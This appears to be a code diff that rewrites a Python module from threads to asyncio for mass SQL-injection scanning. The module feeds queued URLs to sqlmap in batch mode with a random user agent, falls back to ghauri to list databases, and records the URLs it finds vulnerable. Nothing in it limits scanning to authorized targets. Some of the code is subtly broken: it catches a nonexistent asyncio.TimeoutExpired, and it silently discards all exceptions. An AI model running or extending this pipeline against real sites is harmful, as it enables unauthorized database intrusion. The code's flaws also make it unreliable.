@@ -1,20 +1,20 @@
-#!/usr/bin/env python3.10
+import asyncio
 import os
-import subprocess
-import threading
-import re
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import sys
+import re
+
+# Add project root to sys.path
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
+
 from core.config import (
-    VALIDATED_FILE, VULNERABLE_FILE,
     SQLMAP_LEVEL, SQLMAP_RISK, SQLMAP_SCAN_TIMEOUT,
     SQLMAP_CONCURRENT_SCANS, SQLMAP_DBMS,
-    USE_GHAURI_FALLBACK
+    USE_GHAURI_FALLBACK, ASYNC_CONCURRENCY_LIMIT
 )
 
 def _build_sqlmap_args(url):
     args = [
-        "sqlmap", "-u", url,
+        "-u", url,
         "--batch",
         "--random-agent",
         f"--level={SQLMAP_LEVEL}",
@@ -30,134 +30,97 @@ def _build_sqlmap_args(url):
 
 def _build_ghauri_args(url):
     return [
-        "ghauri", "-u", url,
+        "-u", url,
         "--batch",
-        "--dbs",
-        "--current-db",
-        "--current-user",
+        "--dbs"
     ]
 
-class SQLMapManager:
-    def __init__(self, in_q, out_q, max_scans, stats=None):
+class AsyncInjector:
+    def __init__(self, in_q, out_q, stats=None):
         self.in_q = in_q
         self.out_q = out_q
-        self.max_scans = max_scans
-        self.lock = threading.Lock()
-        self.vulnerable_count = 0
         self.stats = stats
-        self._ghauri_available = False
+        self.vulnerable_count = 0
+        self.semaphore = asyncio.Semaphore(SQLMAP_CONCURRENT_SCANS)
 
-    def check_sqlmap_installed(self):
-        try:
-            subprocess.run(["sqlmap", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return True
-        except FileNotFoundError:
-            return False
+    async def scan_target(self, url):
+        async with self.semaphore:
+            # print(f"[*] Testing: {url}")
+            is_vulnerable = False
+            dbms = SQLMAP_DBMS or "Unknown"
 
-    def check_ghauri_installed(self):
-        try:
-            subprocess.run(["ghauri", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return True
-        except FileNotFoundError:
-            return False
-
-    def scan_target(self, url):
-        print(f"[*] Testing: {url}")
-        
-        cmd = _build_sqlmap_args(url)
-        is_vulnerable = False
-        dbms = SQLMAP_DBMS or "Unknown"
-        vuln_type = "SQL Injection"
-
-        try:
-            process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            
             try:
-                stdout, stderr = process.communicate(timeout=SQLMAP_SCAN_TIMEOUT)
-                if "is vulnerable" in stdout or "injectable" in stdout or "fetching" in stdout:
-                    is_vulnerable = True
-                    # Try to extract DBMS from output if it was unknown
-                    if not SQLMAP_DBMS:
-                        match = re.search(r"back-end DBMS: ([\w\s]+)", stdout)
-                        if match:
-                            dbms = match.group(1).strip()
-            except subprocess.TimeoutExpired:
-                process.kill()
-                print(f"[!] Timeout for {url}")
-                return
-
-            if not is_vulnerable and self._ghauri_available:
-                ghauri_cmd = _build_ghauri_args(url)
+                # SQLMap scan
+                process = await asyncio.create_subprocess_exec(
+                    "sqlmap", *_build_sqlmap_args(url),
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE
+                )
+                
                 try:
-                    ghauri_process = subprocess.Popen(
-                        ghauri_cmd,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        text=True
-                    )
-                    g_stdout, g_stderr = ghauri_process.communicate(timeout=SQLMAP_SCAN_TIMEOUT)
-                    g_stdout_lower = g_stdout.lower()
-                    if ("is vulnerable" in g_stdout_lower or 
-                        ("parameter" in g_stdout_lower and "injectable" in g_stdout_lower) or 
-                        "current database" in g_stdout_lower):
+                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=SQLMAP_SCAN_TIMEOUT)
+                    stdout_str = stdout.decode('utf-8', errors='ignore')
+                    if "is vulnerable" in stdout_str or "injectable" in stdout_str or "fetching" in stdout_str:
                         is_vulnerable = True
-                        print(f"[+] Ghauri found vulnerability: {url}")
-                except subprocess.TimeoutExpired:
-                    ghauri_process.kill()
+                        if not SQLMAP_DBMS:
+                            match = re.search(r"back-end DBMS: ([\w\s]+)", stdout_str)
+                            if match: dbms = match.group(1).strip()
+                except asyncio.TimeoutExpired:
+                    try:
+                        process.kill()
+                    except: pass
+                    return
 
-            if is_vulnerable:
-                with self.lock:
+                # Ghauri fallback
+                if not is_vulnerable and USE_GHAURI_FALLBACK:
+                    g_process = await asyncio.create_subprocess_exec(
+                        "ghauri", *_build_ghauri_args(url),
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE
+                    )
+                    try:
+                        g_stdout, g_stderr = await asyncio.wait_for(g_process.communicate(), timeout=SQLMAP_SCAN_TIMEOUT)
+                        g_stdout_str = g_stdout.decode('utf-8', errors='ignore').lower()
+                        if "is vulnerable" in g_stdout_str or "injectable" in g_stdout_str or "current database" in g_stdout_str:
+                            is_vulnerable = True
+                            dbms = "Unknown (Ghauri)"
+                    except asyncio.TimeoutExpired:
+                        try:
+                            g_process.kill()
+                        except: pass
+
+                if is_vulnerable:
                     self.vulnerable_count += 1
                     if self.stats:
                         self.stats.update(vulnerable=self.vulnerable_count)
-                
-                vuln_data = {
-                    "url": url,
-                    "dbms": dbms,
-                    "type": vuln_type
-                }
-                self.out_q.put(vuln_data)
-                print(f"[+] VULNERABLE: {url} ({dbms})")
-            else:
-                pass # Silent for non-vulnerable to reduce noise
+                    
+                    vuln_data = {"url": url, "dbms": dbms}
+                    await self.out_q.put(vuln_data)
+                    # print(f"[+] VULNERABLE: {url} ({dbms})")
 
-        except Exception as e:
-            print(f"[!] Error scanning {url}: {e}")
+            except Exception:
+                pass
 
-    def run(self):
-        if not self.check_sqlmap_installed():
-            print("[!] SQLMap not found!")
-            return
+    async def run(self):
+        tasks = []
+        while True:
+            target = await self.in_q.get()
+            if target is None:
+                if tasks:
+                    await asyncio.gather(*tasks, return_exceptions=True)
+                if self.out_q:
+                    await self.out_q.put(None)
+                self.in_q.task_done()
+                break
+            
+            task = asyncio.create_task(self.scan_target(target))
+            tasks.append(task)
+            
+            if len(tasks) > 100:
+                tasks = [t for t in tasks if not t.done()]
+            
+            self.in_q.task_done()
 
-        self._ghauri_available = USE_GHAURI_FALLBACK and self.check_ghauri_installed()
-
-        print(f"[*] Injector started (Threads: {self.max_scans})")
-        
-        with ThreadPoolExecutor(max_workers=self.max_scans) as executor:
-            while True:
-                target = self.in_q.get()
-                if target is None:
-                    break
-                executor.submit(self.scan_target, target)
-
-        self.out_q.put(None)
-        print(f"[*] Injector finished. Found {self.vulnerable_count} vulnerable targets.")
-
-def main(in_q=None, out_q=None, max_scans=None, stats=None):
-    import queue
-    # This main is mostly for standalone testing if needed, 
-    # but the real app will pass queues.
-    if in_q is None:
-        return
-    
-    max_scans = max_scans or SQLMAP_CONCURRENT_SCANS
-    manager = SQLMapManager(in_q, out_q, max_scans, stats=stats)
-    manager.run()
-
-if __name__ == "__main__":
-    main()
+async def main(in_q, out_q, stats=None):
+    injector = AsyncInjector(in_q, out_q, stats=stats)
+    await injector.run()
